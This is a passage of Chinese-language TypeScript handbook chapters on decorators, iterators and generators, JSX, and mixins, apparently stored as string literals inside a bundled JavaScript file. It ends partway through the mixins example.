装饰器使用`@expression`这种形式，`expression`求值后必须为一个函数，它会在运行时被调用，被装饰的声明信息做为参数传入。\n\n例如，有一个`@sealed`装饰器，我们会这样定义`sealed`函数：\n\n```typescript\nfunction sealed(target) {\n    // do something with "target" ...\n}\n```\n\n> 注意  后面[类装饰器](decorators.md#class-decorators)小节里有一个更加详细的例子。\n\n### 装饰器工厂\n\n如果我们要定制一个修饰器如何应用到一个声明上，我们得写一个装饰器工厂函数。 _装饰器工厂_就是一个简单的函数，它返回一个表达式，以供装饰器在运行时调用。\n\n我们可以通过下面的方式来写一个装饰器工厂函数：\n\n```typescript\nfunction color(value: string) { // 这是一个装饰器工厂\n    return function (target) { //  这是装饰器\n        // do something with "target" and "value"...\n    }\n}\n```\n\n> 注意  下面[方法装饰器](decorators.md#method-decorators)小节里有一个更加详细的例子。\n\n### 装饰器组合\n\n多个装饰器可以同时应用到一个声明上，就像下面的示例：\n\n* 书写在同一行上：\n\n```typescript\n@f @g x\n```\n\n* 书写在多行上：\n\n```typescript\n@f\n@g\nx\n```\n\n当多个装饰器应用于一个声明上，它们求值方式与[复合函数](http://en.wikipedia.org/wiki/Function_composition)相似。在这个模型下，当复合_f_和_g_时，复合的结果\\(_f_ ∘ _g_\\)\\(_x_\\)等同于_f_\\(_g_\\(_x_\\)\\)。\n\n同样的，在TypeScript里，当多个装饰器应用在一个声明上时会进行如下步骤的操作：\n\n1. 由上至下依次对装饰器表达式求值。\n2. 求值的结果会被当作函数，由下至上依次调用。\n\n如果我们使用[装饰器工厂](decorators.md#decorator-factories)的话，可以通过下面的例子来观察它们求值的顺序：\n\n```typescript\nfunction f() {\n    console.log("f(): evaluated");\n    return function (target, propertyKey: string, descriptor: PropertyDescriptor) {\n        console.log("f(): called");\n    }\n}\n\nfunction g() {\n    console.log("g(): evaluated");\n    return function (target, propertyKey: string, descriptor: PropertyDescriptor) {\n        console.log("g(): called");\n    }\n}\n\nclass C {\n    @f()\n    @g()\n    method() {}\n}\n```\n\n在控制台里会打印出如下结果：\n\n```text\nf(): evaluated\ng(): evaluated\ng(): called\nf(): called\n```\n\n### 装饰器求值\n\n类中不同声明上的装饰器将按以下规定的顺序应用：\n\n1. _参数装饰器_，然后依次是_方法装饰器_，_访问符装饰器_，或_属性装饰器_应用到每个实例成员。\n2. _参数装饰器_，然后依次是_方法装饰器_，_访问符装饰器_，或_属性装饰器_应用到每个静态成员。\n3. _参数装饰器_应用到构造函数。\n4. _类装饰器_应用到类。\n\n### 类装饰器\n\n_类装饰器_在类声明之前被声明（紧靠着类声明）。 类装饰器应用于类构造函数，可以用来监视，修改或替换类定义。 类装饰器不能用在声明文件中\\(`.d.ts`\\)，也不能用在任何外部上下文中（比如`declare`的类）。\n\n类装饰器表达式会在运行时当作函数被调用，类的构造函数作为其唯一的参数。\n\n如果类装饰器返回一个值，它会使用提供的构造函数来替换类的声明。\n\n> 注意  如果你要返回一个新的构造函数，你必须注意处理好原来的原型链。 在运行时的装饰器调用逻辑中_不会_为你做这些。\n\n下面是使用类装饰器\\(`@sealed`\\)的例子，应用在`Greeter`类：\n\n```typescript\n@sealed\nclass Greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n    greet() {\n        return "Hello, " + this.greeting;\n    }\n}\n```\n\n我们可以这样定义`@sealed`装饰器：\n\n```typescript\nfunction sealed(constructor: Function) {\n    Object.seal(constructor);\n    Object.seal(constructor.prototype);\n}\n```\n\n当`@sealed`被执行的时候，它将密封此类的构造函数和原型。\\(注：参见[Object.seal](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/seal)\\)\n\n下面是一个重载构造函数的例子。\n\n```typescript\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\n    return class extends constructor {\n        newProperty = "new property";\n        hello = "override";\n    }\n}\n\n@classDecorator\nclass Greeter {\n    property = "property";\n    hello: string;\n    constructor(m: string) {\n        this.hello = m;\n    }\n}\n\nconsole.log(new Greeter("world"));\n```\n\n### 方法装饰器\n\n_方法装饰器_声明在一个方法的声明之前（紧靠着方法声明）。 它会被应用到方法的_属性描述符_上，可以用来监视，修改或者替换方法定义。 方法装饰器不能用在声明文件\\(`.d.ts`\\)，重载或者任何外部上下文（比如`declare`的类）中。\n\n方法装饰器表达式会在运行时当作函数被调用，传入下列3个参数：\n\n1. 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。\n2. 成员的名字。\n3. 成员的_属性描述符_。\n\n> 注意  如果代码输出目标版本小于`ES5`，_属性描述符_将会是`undefined`。\n\n如果方法装饰器返回一个值，它会被用作方法的_属性描述符_。\n\n> 注意  如果代码输出目标版本小于`ES5`返回值会被忽略。\n\n下面是一个方法装饰器（`@enumerable`）的例子，应用于`Greeter`类的方法上：\n\n```typescript\nclass Greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n\n    @enumerable(false)\n    greet() {\n        return "Hello, " + this.greeting;\n    }\n}\n```\n\n我们可以用下面的函数声明来定义`@enumerable`装饰器：\n\n```typescript\nfunction enumerable(value: boolean) {\n    return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n        descriptor.enumerable = value;\n    };\n}\n```\n\n这里的`@enumerable(false)`是一个[装饰器工厂](decorators.md#decorator-factories)。 当装饰器`@enumerable(false)`被调用时，它会修改属性描述符的`enumerable`属性。\n\n### 访问器装饰器\n\n_访问器装饰器_声明在一个访问器的声明之前（紧靠着访问器声明）。 访问器装饰器应用于访问器的_属性描述符_并且可以用来监视，修改或替换一个访问器的定义。 访问器装饰器不能用在声明文件中（.d.ts），或者任何外部上下文（比如`declare`的类）里。\n\n> 注意  TypeScript不允许同时装饰一个成员的`get`和`set`访问器。取而代之的是，一个成员的所有装饰的必须应用在文档顺序的第一个访问器上。这是因为，在装饰器应用于一个_属性描述符_时，它联合了`get`和`set`访问器，而不是分开声明的。\n\n访问器装饰器表达式会在运行时当作函数被调用，传入下列3个参数：\n\n1. 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。\n2. 成员的名字。\n3. 成员的_属性描述符_。\n\n> 注意  如果代码输出目标版本小于`ES5`，_Property Descriptor_将会是`undefined`。\n\n如果访问器装饰器返回一个值，它会被用作方法的_属性描述符_。\n\n> 注意  如果代码输出目标版本小于`ES5`返回值会被忽略。\n\n下面是使用了访问器装饰器（`@configurable`）的例子，应用于`Point`类的成员上：\n\n```typescript\nclass Point {\n    private _x: number;\n    private _y: number;\n    constructor(x: number, y: number) {\n        this._x = x;\n        this._y = y;\n    }\n\n    @configurable(false)\n    get x() { return this._x; }\n\n    @configurable(false)\n    get y() { return this._y; }\n}\n```\n\n我们可以通过如下函数声明来定义`@configurable`装饰器：\n\n```typescript\nfunction configurable(value: boolean) {\n    return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n        descriptor.configurable = value;\n    };\n}\n```\n\n### 属性装饰器\n\n_属性装饰器_声明在一个属性声明之前（紧靠着属性声明）。 属性装饰器不能用在声明文件中（.d.ts），或者任何外部上下文（比如`declare`的类）里。\n\n属性装饰器表达式会在运行时当作函数被调用，传入下列2个参数：\n\n1. 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。\n2. 成员的名字。\n\n> 注意  _属性描述符_不会做为参数传入属性装饰器，这与TypeScript是如何初始化属性装饰器的有关。 因为目前没有办法在定义一个原型对象的成员时描述一个实例属性，并且没办法监视或修改一个属性的初始化方法。返回值也会被忽略。 因此，属性描述符只能用来监视类中是否声明了某个名字的属性。\n\n如果访问符装饰器返回一个值，它会被用作方法的_属性描述符_。\n\n我们可以用它来记录这个属性的元数据，如下例所示：\n\n```typescript\nclass Greeter {\n    @format("Hello, %s")\n    greeting: string;\n\n    constructor(message: string) {\n        this.greeting = message;\n    }\n    greet() {\n        let formatString = getFormat(this, "greeting");\n        return formatString.replace("%s", this.greeting);\n    }\n}\n```\n\n然后定义`@format`装饰器和`getFormat`函数：\n\n```typescript\nimport "reflect-metadata";\n\nconst formatMetadataKey = Symbol("format");\n\nfunction format(formatString: string) {\n    return Reflect.metadata(formatMetadataKey, formatString);\n}\n\nfunction getFormat(target: any, propertyKey: string) {\n    return Reflect.getMetadata(formatMetadataKey, target, propertyKey);\n}\n```\n\n这个`@format("Hello, %s")`装饰器是个 [装饰器工厂](decorators.md#decorator-factories)。 当`@format("Hello, %s")`被调用时，它添加一条这个属性的元数据，通过`reflect-metadata`库里的`Reflect.metadata`函数。 当`getFormat`被调用时，它读取格式的元数据。\n\n> 注意  这个例子需要使用`reflect-metadata`库。 查看[元数据](decorators.md#metadata)了解`reflect-metadata`库更详细的信息。\n\n### 参数装饰器\n\n_参数装饰器_声明在一个参数声明之前（紧靠着参数声明）。 参数装饰器应用于类构造函数或方法声明。 参数装饰器不能用在声明文件（.d.ts），重载或其它外部上下文（比如`declare`的类）里。\n\n参数装饰器表达式会在运行时当作函数被调用，传入下列3个参数：\n\n1. 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。\n2. 成员的名字。\n3. 参数在函数参数列表中的索引。\n\n> 注意  参数装饰器只能用来监视一个方法的参数是否被传入。\n\n参数装饰器的返回值会被忽略。\n\n下例定义了参数装饰器（`@required`）并应用于`Greeter`类方法的一个参数：\n\n```typescript\nclass Greeter {\n    greeting: string;\n\n    constructor(message: string) {\n        this.greeting = message;\n    }\n\n    @validate\n    greet(@required name: string) {\n        return "Hello " + name + ", " + this.greeting;\n    }\n}\n```\n\n然后我们使用下面的函数定义 `@required` 和 `@validate` 装饰器：\n\n```typescript\nimport "reflect-metadata";\n\nconst requiredMetadataKey = Symbol("required");\n\nfunction required(target: Object, propertyKey: string | symbol, parameterIndex: number) {\n    let existingRequiredParameters: number[] = Reflect.getOwnMetadata(requiredMetadataKey, target, propertyKey) || [];\n    existingRequiredParameters.push(parameterIndex);\n    Reflect.defineMetadata(requiredMetadataKey, existingRequiredParameters, target, propertyKey);\n}\n\nfunction validate(target: any, propertyName: string, descriptor: TypedPropertyDescriptor<Function>) {\n    let method = descriptor.value;\n    descriptor.value = function () {\n        let requiredParameters: number[] = Reflect.getOwnMetadata(requiredMetadataKey, target, propertyName);\n        if (requiredParameters) {\n            for (let parameterIndex of requiredParameters) {\n                if (parameterIndex >= arguments.length || arguments[parameterIndex] === undefined) {\n                    throw new Error("Missing required argument.");\n                }\n            }\n        }\n\n        return method.apply(this, arguments);\n    }\n}\n```\n\n`@required`装饰器添加了元数据实体把参数标记为必需的。 `@validate`装饰器把`greet`方法包裹在一个函数里在调用原先的函数前验证函数参数。\n\n> 注意  这个例子使用了`reflect-metadata`库。 查看[元数据](decorators.md#metadata)了解`reflect-metadata`库的更多信息。\n\n### 元数据\n\n一些例子使用了`reflect-metadata`库来支持[实验性的metadata API](https://github.com/rbuckton/ReflectDecorators)。 这个库还不是ECMAScript \\(JavaScript\\)标准的一部分。 然而，当装饰器被ECMAScript官方标准采纳后，这些扩展也将被推荐给ECMAScript以采纳。\n\n你可以通过npm安装这个库：\n\n```text\nnpm i reflect-metadata --save\n```\n\nTypeScript支持为带有装饰器的声明生成元数据。 你需要在命令行或`tsconfig.json`里启用`emitDecoratorMetadata`编译器选项。\n\n**Command Line**:\n\n```text\ntsc --target ES5 --experimentalDecorators --emitDecoratorMetadata\n```\n\n**tsconfig.json**:\n\n```javascript\n{\n    "compilerOptions": {\n        "target": "ES5",\n        "experimentalDecorators": true,\n        "emitDecoratorMetadata": true\n    }\n}\n```\n\n当启用后，只要`reflect-metadata`库被引入了，设计阶段添加的类型信息可以在运行时使用。\n\n如下例所示：\n\n```typescript\nimport "reflect-metadata";\n\nclass Point {\n    x: number;\n    y: number;\n}\n\nclass Line {\n    private _p0: Point;\n    private _p1: Point;\n\n    @validate\n    set p0(value: Point) { this._p0 = value; }\n    get p0() { return this._p0; }\n\n    @validate\n    set p1(value: Point) { this._p1 = value; }\n    get p1() { return this._p1; }\n}\n\nfunction validate<T>(target: any, propertyKey: string, descriptor: TypedPropertyDescriptor<T>) {\n    let set = descriptor.set;\n    descriptor.set = function (value: T) {\n        let type = Reflect.getMetadata("design:type", target, propertyKey);\n        if (!(value instanceof type)) {\n            throw new TypeError("Invalid type.");\n        }\n        set.call(target, value);\n    }\n}\n```\n\nTypeScript编译器可以通过`@Reflect.metadata`装饰器注入设计阶段的类型信息。 你可以认为它相当于下面的TypeScript：\n\n```typescript\nclass Line {\n    private _p0: Point;\n    private _p1: Point;\n\n    @validate\n    @Reflect.metadata("design:type", Point)\n    set p0(value: Point) { this._p0 = value; }\n    get p0() { return this._p0; }\n\n    @validate\n    @Reflect.metadata("design:type", Point)\n    set p1(value: Point) { this._p1 = value; }\n    get p1() { return this._p1; }\n}\n```\n\n> 注意  装饰器元数据是个实验性的特性并且可能在以后的版本中发生破坏性的改变（breaking changes）。\n\n',_l='# Iterators 和 Generators\n\n当一个对象实现了[`Symbol.iterator`](symbols.md#symboliterator)属性时，我们认为它是可迭代的。 一些内置的类型如`Array`，`Map`，`Set`，`String`，`Int32Array`，`Uint32Array`等都已经实现了各自的`Symbol.iterator`。 对象上的`Symbol.iterator`函数负责返回供迭代的值。\n\n## `for..of` 语句\n\n`for..of`会遍历可迭代的对象，调用对象上的`Symbol.iterator`方法。 下面是在数组上使用`for..of`的简单例子：\n\n```typescript\nlet someArray = [1, "string", false];\n\nfor (let entry of someArray) {\n    console.log(entry); // 1, "string", false\n}\n```\n\n### `for..of` vs. `for..in` 语句\n\n`for..of`和`for..in`均可迭代一个列表；但是用于迭代的值却不同，`for..in`迭代的是对象的 _键_ 的列表，而`for..of`则迭代对象的键对应的值。\n\n下面的例子展示了两者之间的区别：\n\n```typescript\nlet list = [4, 5, 6];\n\nfor (let i in list) {\n    console.log(i); // "0", "1", "2",\n}\n\nfor (let i of list) {\n    console.log(i); // "4", "5", "6"\n}\n```\n\n另一个区别是`for..in`可以操作任何对象；它提供了查看对象属性的一种方法。 但是`for..of`关注于迭代对象的值。内置对象`Map`和`Set`已经实现了`Symbol.iterator`方法，让我们可以访问它们保存的值。\n\n```typescript\nlet pets = new Set(["Cat", "Dog", "Hamster"]);\npets["species"] = "mammals";\n\nfor (let pet in pets) {\n    console.log(pet); // "species"\n}\n\nfor (let pet of pets) {\n    console.log(pet); // "Cat", "Dog", "Hamster"\n}\n```\n\n### 代码生成\n\n#### 目标为 ES5 和 ES3\n\n当生成目标为ES5或ES3，迭代器只允许在`Array`类型上使用。 在非数组值上使用`for..of`语句会得到一个错误，就算这些非数组值已经实现了`Symbol.iterator`属性。\n\n编译器会生成一个简单的`for`循环做为`for..of`循环，比如：\n\n```typescript\nlet numbers = [1, 2, 3];\nfor (let num of numbers) {\n    console.log(num);\n}\n```\n\n生成的代码为：\n\n```javascript\nvar numbers = [1, 2, 3];\nfor (var _i = 0; _i < numbers.length; _i++) {\n    var num = numbers[_i];\n    console.log(num);\n}\n```\n\n#### 目标为 ECMAScript 2015 或更高\n\n当目标为兼容ECMAScipt 2015的引擎时，编译器会生成相应引擎的`for..of`内置迭代器实现方式。\n\n',xl='# JSX\n\n## 介绍\n\n[JSX](https://facebook.github.io/jsx/)是一种嵌入式的类似XML的语法。 它可以被转换成合法的JavaScript，尽管转换的语义是依据不同的实现而定的。 JSX因[React](https://reactjs.org/)框架而流行，但也存在其它的实现。 TypeScript支持内嵌，类型检查以及将JSX直接编译为JavaScript。\n\n## 基本用法\n\n想要使用JSX必须做两件事：\n\n1. 给文件一个`.tsx`扩展名\n2. 启用`jsx`选项\n\nTypeScript具有三种JSX模式：`preserve`，`react`和`react-native`。 这些模式只在代码生成阶段起作用 - 类型检查并不受影响。 在`preserve`模式下生成代码中会保留JSX以供后续的转换操作使用（比如：[Babel](https://babeljs.io/)）。 另外，输出文件会带有`.jsx`扩展名。 `react`模式会生成`React.createElement`，在使用前不需要再进行转换操作了，输出文件的扩展名为`.js`。 `react-native`相当于`preserve`，它也保留了所有的JSX，但是输出文件的扩展名是`.js`。\n\n| 模式 | 输入 | 输出 | 输出文件扩展名 |\n| :--- | :--- | :--- | :--- |\n| `preserve` | `<div />` | `<div />` | `.jsx` |\n| `react` | `<div />` | `React.createElement("div")` | `.js` |\n| `react-native` | `<div />` | `<div />` | `.js` |\n\n你可以通过在命令行里使用`--jsx`标记或[tsconfig.json](../project-config/tsconfig.json.md)里的选项来指定模式。\n\n> \\*注意：当输出目标为`react JSX`时，你可以使用`--jsxFactory`指定JSX工厂函数（默认值为`React.createElement`）\n\n## `as`操作符\n\n回想一下怎么写类型断言：\n\n```typescript\nvar foo = <foo>bar;\n```\n\n这里断言`bar`变量是`foo`类型的。 因为TypeScript也使用尖括号来表示类型断言，在结合JSX的语法后将带来解析上的困难。因此，TypeScript在`.tsx`文件里禁用了使用尖括号的类型断言。\n\n由于不能够在`.tsx`文件里使用上述语法，因此我们应该使用另一个类型断言操作符：`as`。 上面的例子可以很容易地使用`as`操作符改写：\n\n```typescript\nvar foo = bar as foo;\n```\n\n`as`操作符在`.ts`和`.tsx`里都可用，并且与尖括号类型断言行为是等价的。\n\n## 类型检查\n\n为了理解JSX的类型检查，你必须首先理解固有元素与基于值的元素之间的区别。 假设有这样一个JSX表达式`<expr />`，`expr`可能引用环境自带的某些东西（比如，在DOM环境里的`div`或`span`）或者是你自定义的组件。 这是非常重要的，原因有如下两点：\n\n1. 对于React，固有元素会生成字符串（`React.createElement("div")`），然而由你自定义的组件却不会生成（`React.createElement(MyComponent)`）。\n2. 传入JSX元素里的属性类型的查找方式不同。\n\n   固有元素属性_本身_就支持，然而自定义的组件会自己去指定它们具有哪个属性。\n\nTypeScript使用[与React相同的规范](http://facebook.github.io/react/docs/jsx-in-depth.html#html-tags-vs.-react-components) 来区别它们。 固有元素总是以一个小写字母开头，基于值的元素总是以一个大写字母开头。\n\n### 固有元素\n\n固有元素使用特殊的接口`JSX.IntrinsicElements`来查找。 默认地，如果这个接口没有指定，会全部通过，不对固有元素进行类型检查。 然而，如果这个接口存在，那么固有元素的名字需要在`JSX.IntrinsicElements`接口的属性里查找。 例如：\n\n```typescript\ndeclare namespace JSX {\n    interface IntrinsicElements {\n        foo: any\n    }\n}\n\n<foo />; // 正确\n<bar />; // 错误\n```\n\n在上例中，`<foo />`没有问题，但是`<bar />`会报错，因为它没在`JSX.IntrinsicElements`里指定。\n\n> 注意：你也可以在`JSX.IntrinsicElements`上指定一个用来捕获所有字符串索引：\n\n```typescript\ndeclare namespace JSX {\n    interface IntrinsicElements {\n        [elemName: string]: any;\n    }\n}\n```\n\n### 基于值的元素\n\n基于值的元素会简单的在它所在的作用域里按标识符查找。\n\n```typescript\nimport MyComponent from "./myComponent";\n\n<MyComponent />; // 正确\n<SomeOtherComponent />; // 错误\n```\n\n有两种方式可以定义基于值的元素：\n\n1. 函数组件 \\(FC\\)\n2. 类组件\n\n由于这两种基于值的元素在JSX表达式里无法区分，因此TypeScript首先会尝试将表达式做为函数组件进行解析。如果解析成功，那么TypeScript就完成了表达式到其声明的解析操作。如果按照函数组件解析失败，那么TypeScript会继续尝试以类组件的形式进行解析。如果依旧失败，那么将输出一个错误。\n\n#### 函数组件\n\n正如其名，组件被定义成JavaScript函数，它的第一个参数是`props`对象。 TypeScript会强制它的返回值可以赋值给`JSX.Element`。\n\n```typescript\ninterface FooProp {\n  name: string;\n  X: number;\n  Y: number;\n}\n\ndeclare function AnotherComponent(prop: {name: string});\nfunction ComponentFoo(prop: FooProp) {\n  return <AnotherComponent name={prop.name} />;\n}\n\nconst Button = (prop: {value: string}, context: { color: string }) => <button>\n```\n\n由于函数组件是简单的JavaScript函数，所以我们还可以利用函数重载。\n\n```typescript\ninterface ClickableProps {\n  children: JSX.Element[] | JSX.Element\n}\n\ninterface HomeProps extends ClickableProps {\n  home: JSX.Element;\n}\n\ninterface SideProps extends ClickableProps {\n  side: JSX.Element | string;\n}\n\nfunction MainButton(prop: HomeProps): JSX.Element;\nfunction MainButton(prop: SideProps): JSX.Element {\n  ...\n}\n```\n\n> 注意：函数组件之前叫做无状态函数组件（SFC）。由于在当前React版本里，函数组件不再被当作是无状态的，因此类型`SFC`和它的别名`StatelessComponent`被废弃了。\n\n#### 类组件\n\n我们可以定义类组件的类型。 然而，我们首先最好弄懂两个新的术语：_元素类的类型_和_元素实例的类型_。\n\n现在有`<Expr />`，_元素类的类型_为`Expr`的类型。 所以在上面的例子里，如果`MyComponent`是ES6的类，那么类类型就是类的构造函数和静态部分。 如果`MyComponent`是个工厂函数，类类型为这个函数。\n\n一旦建立起了类类型，实例类型由类构造器或调用签名（如果存在的话）的返回值的联合构成。 再次说明，在ES6类的情况下，实例类型为这个类的实例的类型，并且如果是工厂函数，实例类型为这个函数返回值类型。\n\n```typescript\nclass MyComponent {\n  render() {}\n}\n\n// 使用构造签名\nvar myComponent = new MyComponent();\n\n// 元素类的类型 => MyComponent\n// 元素实例的类型 => { render: () => void }\n\nfunction MyFactoryFunction() {\n  return {\n    render: () => {\n    }\n  }\n}\n\n// 使用调用签名\nvar myComponent = MyFactoryFunction();\n\n// 元素类的类型 => MyFactoryFunction\n// 元素实例的类型 => { render: () => void }\n```\n\n元素的实例类型很有趣，因为它必须赋值给`JSX.ElementClass`或抛出一个错误。 默认的`JSX.ElementClass`为`{}`，但是它可以被扩展用来限制JSX的类型以符合相应的接口。\n\n```typescript\ndeclare namespace JSX {\n  interface ElementClass {\n    render: any;\n  }\n}\n\nclass MyComponent {\n  render() {}\n}\nfunction MyFactoryFunction() {\n  return { render: () => {} }\n}\n\n<MyComponent />; // 正确\n<MyFactoryFunction />; // 正确\n\nclass NotAValidComponent {}\nfunction NotAValidFactoryFunction() {\n  return {};\n}\n\n<NotAValidComponent />; // 错误\n<NotAValidFactoryFunction />; // 错误\n```\n\n### 属性类型检查\n\n属性类型检查的第一步是确定_元素属性类型_。 这在固有元素和基于值的元素之间稍有不同。\n\n对于固有元素，这是`JSX.IntrinsicElements`属性的类型。\n\n```typescript\ndeclare namespace JSX {\n  interface IntrinsicElements {\n    foo: { bar?: boolean }\n  }\n}\n\n// `foo`的元素属性类型为`{bar?: boolean}`\n<foo bar />;\n```\n\n对于基于值的元素，就稍微复杂些。 它取决于先前确定的在元素实例类型上的某个属性的类型。 至于该使用哪个属性来确定类型取决于`JSX.ElementAttributesProperty`。 它应该使用单一的属性来定义。 这个属性名之后会被使用。 TypeScript 2.8，如果未指定`JSX.ElementAttributesProperty`，那么将使用类元素构造函数或函数组件调用的第一个参数的类型。\n\n```typescript\ndeclare namespace JSX {\n  interface ElementAttributesProperty {\n    props; // 指定用来使用的属性名\n  }\n}\n\nclass MyComponent {\n  // 在元素实例类型上指定属性\n  props: {\n    foo?: string;\n  }\n}\n\n// `MyComponent`的元素属性类型为`{foo?: string}`\n<MyComponent foo="bar" />\n```\n\n元素属性类型用于的JSX里进行属性的类型检查。 支持可选属性和必须属性。\n\n```typescript\ndeclare namespace JSX {\n  interface IntrinsicElements {\n    foo: { requiredProp: string; optionalProp?: number }\n  }\n}\n\n<foo requiredProp="bar" />; // 正确\n<foo requiredProp="bar" optionalProp={0} />; // 正确\n<foo />; // 错误, 缺少 requiredProp\n<foo requiredProp={0} />; // 错误, requiredProp 应该是字符串\n<foo requiredProp="bar" unknownProp />; // 错误, unknownProp 不存在\n<foo requiredProp="bar" some-unknown-prop />; // 正确, `some-unknown-prop`不是个合法的标识符\n```\n\n> 注意：如果一个属性名不是个合法的JS标识符（像`data-*`属性），并且它没出现在元素属性类型里时不会当做一个错误。\n\n另外，JSX还会使用`JSX.IntrinsicAttributes`接口来指定额外的属性，这些额外的属性通常不会被组件的props或arguments使用 - 比如React里的`key`。还有，`JSX.IntrinsicClassAttributes<T>`泛型类型也可以用来为类组件（非函数组件）指定相同种类的额外属性。这里的泛型参数表示类实例类型。在React里，它用来允许`Ref<T>`类型上的`ref`属性。通常来讲，这些接口上的所有属性都是可选的，除非你想要用户在每个JSX标签上都提供一些属性。\n\n延展操作符也可以使用：\n\n```jsx\nvar props = { requiredProp: \'bar\' };\n<foo {...props} />; // 正确\n\nvar badProps = {};\n<foo {...badProps} />; // 错误\n```\n\n### 子孙类型检查\n\n从TypeScript 2.3开始，我们引入了_children_类型检查。_children_是_元素属性\\(attribute\\)类型_的一个特殊属性\\(property\\)，子_JSXExpression_将会被插入到属性里。 与使用`JSX.ElementAttributesProperty`来决定_props_名类似，我们可以利用`JSX.ElementChildrenAttribute`来决定_children_名。 `JSX.ElementChildrenAttribute`应该被声明在单一的属性\\(property\\)里。\n\n```typescript\ndeclare namespace JSX {\n  interface ElementChildrenAttribute {\n    children: {};  // specify children name to use\n  }\n}\n```\n\n如不特殊指定子孙的类型，我们将使用[React typings](https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/react)里的默认类型。\n\n```typescript\n<div>\n  <h1>Hello</h1>\n</div>;\n\n<div>\n  <h1>Hello</h1>\n  World\n</div>;\n\nconst CustomComp = (props) => <div>{props.children}</div>\n<CustomComp>\n  <div>Hello World</div>\n  {"This is just a JS expression..." + 1000}\n</CustomComp>\n```\n\n```typescript\ninterface PropsType {\n  children: JSX.Element\n  name: string\n}\n\nclass Component extends React.Component<PropsType, {}> {\n  render() {\n    return (\n      <h2>\n        {this.props.children}\n      </h2>\n    )\n  }\n}\n\n// OK\n<Component name="foo">\n  <h1>Hello World</h1>\n</Component>\n\n// Error: children is of type JSX.Element not array of JSX.Element\n<Component name="bar">\n  <h1>Hello World</h1>\n  <h2>Hello World</h2>\n</Component>\n\n// Error: children is of type JSX.Element not array of JSX.Element or string.\n<Component name="baz">\n  <h1>Hello</h1>\n  World\n</Component>\n```\n\n## JSX结果类型\n\n默认地JSX表达式结果的类型为`any`。 你可以自定义这个类型，通过指定`JSX.Element`接口。 然而，不能够从接口里检索元素，属性或JSX的子元素的类型信息。 它是一个黑盒。\n\n## 嵌入的表达式\n\nJSX允许你使用`{ }`标签来内嵌表达式。\n\n```jsx\nvar a = <div>\n  {[\'foo\', \'bar\'].map(i => <span>{i / 2}</span>)}\n</div>\n```\n\n上面的代码产生一个错误，因为你不能用数字来除以一个字符串。 输出如下，若你使用了`preserve`选项：\n\n```jsx\nvar a = <div>\n  {[\'foo\', \'bar\'].map(function (i) { return <span>{i / 2}</span>; })}\n</div>\n```\n\n## React整合\n\n要想一起使用JSX和React，你应该使用[React类型定义](https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/react)。 这些类型声明定义了`JSX`合适命名空间来使用React。\n\n```typescript\n/// <reference path="react.d.ts" />\n\ninterface Props {\n  foo: string;\n}\n\nclass MyComponent extends React.Component<Props, {}> {\n  render() {\n    return <span>{this.props.foo}</span>\n  }\n}\n\n<MyComponent foo="bar" />; // 正确\n<MyComponent foo={0} />; // 错误\n```\n\n## 工厂函数\n\n`jsx: react`编译选项使用的工厂函数是可以配置的。可以使用`jsxFactory`命令行选项，或内联的`@jsx`注释指令在每个文件上设置。比如，给`createElement`设置`jsxFactory`，`<div />`会使用`createElement("div")`来生成，而不是`React.createElement("div")`。\n\n注释指令可以像下面这样使用（在TypeScript 2.8里）：\n\n```typescript\nimport preact = require("preact");\n/* @jsx preact.h */\nconst x = <div />;\n```\n\n生成：\n\n```typescript\nconst preact = require("preact");\nconst x = preact.h("div", null);\n```\n\n工厂函数的选择同样会影响`JSX`命名空间的查找（类型检查）。如果工厂函数使用`React.createElement`定义（默认），编译器会先检查`React.JSX`，之后才检查全局的`JSX`。如果工厂函数定义为`h`，那么在检查全局的`JSX`之前先检查`h.JSX`。\n\n',wl='# 混入\n\n## Table of contents\n\n[介绍](mixins.md#introduction)\n\n[混入示例](mixins.md#mixin-sample)\n\n[理解示例](mixins.md#understanding-the-sample)\n\n## 介绍\n\n[**↥ 回到顶端**](mixins.md#table-of-contents)\n\n除了传统的面向对象继承方式，还流行一种通过可重用组件创建类的方式，就是联合另一个简单类的代码。 你可能在Scala等语言里对mixins及其特性已经很熟悉了，但它在JavaScript中也是很流行的。\n\n## 混入示例\n\n[**↥ 回到顶端**](mixins.md#table-of-contents)\n\n下面的代码演示了如何在TypeScript里使用混入。 后面我们还会解释这段代码是怎么工作的。\n\n```typescript\n// Disposable Mixin\nclass Disposable {\n    isDisposed: boolean;\n    dispose() {\n        this.isDisposed = true;\n    }\n\n}\n\n// Activatable Mixin\nclass Activatable {\n    isActive: boolean;\n    activate() {\n        this.isActive = true;\n    }\n    deactivate() {\n        this.isActive = false;\n    }\n}\n\nclass SmartObject {\n    constructor() {\n        setInterval(() => console.log(this.isActive + " : " + this.isDisposed), 500);\n    }\n\n    interact() {\n        this.activate();\n    }\n}\n\ninterface SmartObject extends Disposable, Activatable {}\napplyMixins(SmartObject, [Disposable, Activatable]);\n\nlet smartObj = new SmartObject();\nsetTimeout(() => smartObj.interact(), 1000);\n\n////////////////////////////////////////\n// In your runtime library somewhere\n////////////////////////////////////////\n\nfunction applyMixins(derivedCtor: any, baseCtors: any[]) {\n    baseCtors.forEach(baseCtor => {\n        Object.getOwnPropertyNames(baseCtor.prototype).forEach(name => {\n            Object.defineProperty(derivedCtor.prototype, name, Object.getOwnPropertyDescriptor(baseCtor.prototype, name));\n        });\n    });\n}\n```\n\n## 理解示例\n\n[**↥ 回到顶端**](mixins.md#table-of-contents)\n\n代码里首先定义了两个类，它们将做为mixins。 可以看到每个类都只定义了一个特定的行为或功能。 稍后我们使用它们来创建一个新类，同时具有这两种功能。\n\n```typescript\n// Disposable Mixin\nclass Disposable {\n    isDisposed: boolean;\n    dispose() {\n        this.isDisposed = true;\n    }\n\n}\n\n// Activatable Mixin\nclass Activatable {\n    isActive: boolean;\n    activate() {\n        this.isActive = true;\n    }\n    deactivate() {\n        this.isActive = false;\n    